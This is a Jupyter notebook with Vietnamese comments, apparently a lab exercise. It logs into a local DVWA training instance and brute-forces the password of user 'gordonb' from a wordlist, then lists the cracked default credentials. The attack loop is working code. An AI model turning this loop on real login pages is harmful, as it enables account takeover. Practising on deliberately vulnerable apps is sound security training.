{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## DVWA BRUTE FORCE LOW LEVEL"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 1. Import thư viện và khai báo các biến toàn cục"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from bs4 import BeautifulSoup # Thư viện xử lý HTML"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "USERNAME = \"admin\"  \n",
    "PASSWORD = \"password\"\n",
    "BASE_URL = \"http://localhost:32768/\" # DVWA Base URL"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 2. Sử dụng session để lưu trữ cookie và dữ liệu phiên làm việc"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Lưu trữ phiên làm việc\n",
    "session = requests.Session()"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 3. Truy cập trang đăng nhập để lấy cookie và dữ liệu phiên làm việc"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "login_page = session.get(BASE_URL + \"login.php\")\n",
    "soup = BeautifulSoup(login_page.content, 'html.parser')\n",
    "user_token = soup.find('input', {'name': 'user_token'}).get('value')"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 4. Gửi yêu cầu đăng nhập"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "data = {\"username\": USERNAME, \"password\": PASSWORD, \"user_token\": user_token, \"Login\": \"Login#\"}\n",
    "response = session.post(BASE_URL + \"login.php\", data=data)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 5. Kiểm tra đăng nhập thành công hay không"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Lưu trữ nội dung trang dashboard\n",
    "dashboard_page = session.get(BASE_URL + \"index.php\")\n",
    "\n",
    "# Lưu trữ tiêu đề dashboard\n",
    "dashboard_title = BeautifulSoup(dashboard_page.content, 'html.parser').title.text\n",
    "\n",
    "# Kiểm tra đăng nhập thành công hay không\n",
    "if \"Welcome :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*\" == dashboard_title:\n",
    "    print(\"Đăng nhập thành công\")\n",
    "else:\n",
    "    print(\"Đăng nhập thất bại\")"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 6. Thực hiện tấn công brute-force"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Username thực hiện tấn công mật khẩu\n",
    "username = \"gordonb\"\n",
    "\n",
    "# Lưu trữ dãy các mật khẩu có thể\n",
    "with open('password-list-all.txt', encoding='utf-8') as f:\n",
    "    passwords = f.readlines()\n",
    "\n",
    "# Thử các mật khẩu có thể\n",
    "for password in passwords:\n",
    "\n",
    "    # Loại bỏ kí tự thừa\n",
    "    password = password.split()\n",
    "\n",
    "    # Lưu trữ các tham số vào biến params\n",
    "    params = {\"username\": username, \"password\": password, \"Login\": \"Login#\"}\n",
    "\n",
    "    # Lưu kết quả trả về của trang brute force vào biến result\n",
    "    result = session.get(BASE_URL + \"vulnerabilities/brute/\", params = params)\n",
    "    \n",
    "    # Kiểm tra mật khẩu thử có đúng không\n",
    "    if \"Welcome to the password protected area\" in result.text:\n",
    "        print(\"Tấn công thành công với mật khẩu của {} là {}\".format(username,password))\n",
    "        break"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## KẾT QUẢ\n",
    "\n",
    "    admin: password\n",
    "    gordonb: abc123\n",
    "    1337: charley\n",
    "    pablo: letmein\n",
    "    smithy: password"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.3"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
